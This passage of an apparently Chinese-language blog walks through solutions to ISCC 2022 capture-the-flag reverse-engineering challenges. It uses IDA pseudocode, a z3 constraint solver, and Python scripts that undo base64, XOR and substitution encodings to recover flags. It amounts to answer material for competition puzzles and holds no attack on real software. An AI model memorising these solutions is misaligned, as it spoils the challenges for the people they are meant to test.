<span class="line" data-line="13"><span style="color:#E1E4E8">s.add(</span><span style="color:#79B8FF">38</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 32</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">15503BC5DF</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">s.add(v16[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 41</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 25</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">2922F20B4</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="15"></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">v4</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[]</span></span>
<span class="line" data-line="17"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(s.check()</span><span style="color:#F97583">==</span><span style="color:#E1E4E8">sat):</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">    m</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">s.model()</span></span>
<span class="line" data-line="19"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">        v4.append(</span><span style="color:#79B8FF">hex</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(m[v16[i]])))[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:])</span></span>
<span class="line" data-line="21"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(v4)</span></span>
<span class="line" data-line="22"></span>
<span class="line" data-line="23"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="24"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> j </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="25"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">chr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(v4[i][j</span><span style="color:#F97583">*</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:j</span><span style="color:#F97583">*</span><span style="color:#79B8FF">2</span><span style="color:#F97583">+</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">],</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">)),</span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">)</span></span></code></pre>
<h3 id="ruststr">Ruststr</h3>
<blockquote>
<p>图非图，字非字。</p>
</blockquote>
<p><code>ida x64</code> 打开，定位到 <code>iscc_reverse::main</code> ，<code>F5</code> 查看伪代码，有个 <code>qmecpy</code> 函数。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507142403668.png" alt="image-20220507142403668"></p>
<p>放入 <code>base64</code> 转 <code>hex</code> 脚本并 <code>两个</code> 为一节作为 <code>0xXX</code> 格式和第二个脚本的上下数列格式相同</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> base64</span></span>
<span class="line" data-line="2"></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">a</span><span style="color:#F97583">=</span><span style="color:#F97583">r</span><span style="color:#9ECBFF">'</span><span style="color:#DBEDFF">5D2AJMcNo7oAxwWMZJdOCj5LUQePeWBbmw==</span><span style="color:#9ECBFF">'</span></span>
<span class="line" data-line="4"></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">b</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">19</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">21</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">18</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">13</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">22</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">17</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">23</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">15</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="6"></span>
<span class="line" data-line="7"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> b:</span></span>
<span class="line" data-line="8"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(a[i],</span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="9"></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">flag </span><span style="color:#F97583">=</span><span style="color:#9ECBFF">""</span></span>
<span class="line" data-line="11"></span>
<span class="line" data-line="12"><span style="color:#F97583">def</span><span style="color:#B392F0"> base64_to_hex</span><span style="color:#E1E4E8">(payLoad_base64):</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">    bytes_out </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> base64.b64decode(payLoad_base64)</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">    str_out </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bytes_out.hex()</span></span>
<span class="line" data-line="15"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"base64_ to_ hex:"</span><span style="color:#E1E4E8">,str_out)</span></span>
<span class="line" data-line="16"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(str_out)</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">    c </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
<span class="line" data-line="18"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> k </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> str_out:</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">        c.append(</span><span style="color:#9ECBFF">'0x'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> str_out[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">])</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">        str_out </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> str_out[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:]</span></span>
<span class="line" data-line="21"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(c)</span></span>
<span class="line" data-line="22"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> str_out</span></span>
<span class="line" data-line="23"></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">base64_to_hex(a)</span></span></code></pre>
<p>然后将结果输入以下</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">b </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span></span>
<span class="line" data-line="2"><span style="color:#F97583">0x</span><span style="color:#79B8FF">9A</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">78</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">B6</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">BE</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">66</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">8D</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">CF</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">51</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">9E</span><span style="color:#E1E4E8">,</span></span>
<span class="line" data-line="3"><span style="color:#F97583">0x</span><span style="color:#79B8FF">63</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">CB</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4A</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">D1</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">1A</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">59</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">78</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">1C</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">17</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">73</span><span style="color:#E1E4E8">,</span></span>
<span class="line" data-line="4"><span style="color:#F97583">0x</span><span style="color:#79B8FF">F2</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">1D</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">05</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">2F</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">F0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">D7</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">B3</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">22</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">5D</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">AD</span><span style="color:#E1E4E8">,</span></span>
<span class="line" data-line="5"><span style="color:#F97583">0x</span><span style="color:#79B8FF">0B</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">E2</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">c </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">e4</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">3d</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">80</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">24</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">c7</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">0d</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">a3</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">ba</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">00</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">c7</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">05</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">8c</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">97</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4e</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">0a</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">3e</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4b</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">51</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">07</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">8f</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">79</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">60</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">5b</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">9b</span><span style="color:#E1E4E8">] </span><span style="color:#6A737D"># 这里填写是base64解码后的hex 来源是有个qmemcpy函数那里</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">m </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
<span class="line" data-line="9"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(c)):</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">    m.append(c[i]</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">b[i])</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">key </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">63</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">65</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">61</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">39</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">66</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">30</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">34</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">63</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">33</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">62</span><span style="color:#E1E4E8">,</span></span>
<span class="line" data-line="12"><span style="color:#F97583">0x</span><span style="color:#79B8FF">34</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">38</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">33</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">39</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">34</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">30</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">65</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">63</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">30</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">65</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">,</span></span>
<span class="line" data-line="13"><span style="color:#F97583">0x</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">39</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">62</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">65</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">38</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="14"><span style="color:#F97583">def</span><span style="color:#B392F0"> lll</span><span style="color:#E1E4E8">(a,b):</span></span>
<span class="line" data-line="15"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> a</span><span style="color:#F97583">></span><span style="color:#E1E4E8">b:</span></span>
<span class="line" data-line="16"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 0</span></span>
<span class="line" data-line="17"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="18"><span style="color:#F97583">        return</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">f </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span></span>
<span class="line" data-line="20"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(m)):</span></span>
<span class="line" data-line="21"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> j </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">128</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="22"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (lll((key[i]</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">d0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;0x</span><span style="color:#79B8FF">ff</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">a</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> j </span><span style="color:#F97583">+</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;0x</span><span style="color:#79B8FF">ff</span><span style="color:#F97583"> ==</span><span style="color:#E1E4E8"> m[i]:</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">            f </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(j)</span></span>
<span class="line" data-line="24"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(f)</span></span>
<span class="line" data-line="25"><span style="color:#F97583">            break</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> list</span><span style="color:#E1E4E8">(f[::</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">])</span></span>
<span class="line" data-line="27"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">()</span></span>
<span class="line" data-line="28"><span style="color:#F97583">def</span><span style="color:#B392F0"> ppp</span><span style="color:#E1E4E8">(num):</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">    a </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> num</span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF">1</span></span>
<span class="line" data-line="30"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> a</span><span style="color:#F97583">==</span><span style="color:#79B8FF">0</span></span>
<span class="line" data-line="31"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(p)):</span></span>
<span class="line" data-line="32"><span style="color:#F97583">    if</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(p[i])</span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'z'</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">        p[i] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(p[i])</span><span style="color:#F97583">^0x</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="34"><span style="color:#F97583">    elif</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'A'</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(p[i])</span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Z'</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">        p[i] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(p[i])</span><span style="color:#F97583">^0x</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="36"><span style="color:#F97583">    elif</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'0'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(p[i])</span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'9'</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">        a </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(p[i]) </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">        b </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> ord</span><span style="color:#E1E4E8">(p[i]) </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span></span>
<span class="line" data-line="39"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> ppp(</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(p[i])):</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">            p[i] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(a)</span></span>
<span class="line" data-line="41"><span style="color:#F97583">        else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">            p[i] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">(b)</span></span>
<span class="line" data-line="43"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="44"><span style="color:#F97583">        pass</span></span>
<span class="line" data-line="45"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(p)):</span></span>
<span class="line" data-line="46"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(p[i],</span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">)</span></span></code></pre>
<h3 id="getthetable">GetTheTable</h3>
<blockquote>
<p>采用正确的解密软件就能快速解密</p>
</blockquote>
<p><code>ida x64</code>打开，直接 <code>F5</code> 查看伪代码</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220510144031821.png" alt="image-20220510144031821"></p>
<p>复制出来直接 <code>base58</code> 解密</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220510144156739.png" alt="image-20220510144156739"></p>
<h3 id="bobs-code">Bob’s Code</h3>
<blockquote>
<p>好简单的题目呀！</p>
</blockquote>
<p><code>ida x32</code> 打开，定位到 <code>_main_0</code> ，<code>F5</code> 查看伪代码</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220510143833993.png" alt="image-20220510143833993"></p>
<p>说白了就是 <code>换表</code></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> base64</span></span>
<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> string</span></span>
<span class="line" data-line="3"></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">s</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'W1BqthGbfhpZcbXjWbhLgG5FoZBBYGRVXhXtf1NRoY5ctGG1XXBMVXtwoF0'</span><span style="color:#6A737D">#去掉三个.</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">t </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span></span>
<span class="line" data-line="6"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> c </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> s:</span></span>
<span class="line" data-line="7"><span style="color:#F97583">    if</span><span style="color:#9ECBFF"> 'a'</span><span style="color:#F97583"> &#x3C;=</span><span style="color:#E1E4E8"> c </span><span style="color:#F97583">&#x3C;=</span><span style="color:#9ECBFF"> 'z'</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">        t </span><span style="color:#F97583">+=</span><span style="color:#79B8FF"> chr</span><span style="color:#E1E4E8">( </span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> ((</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(c)</span><span style="color:#F97583">-</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8"> )</span><span style="color:#F97583">%</span><span style="color:#79B8FF">26</span><span style="color:#E1E4E8"> )</span></span>
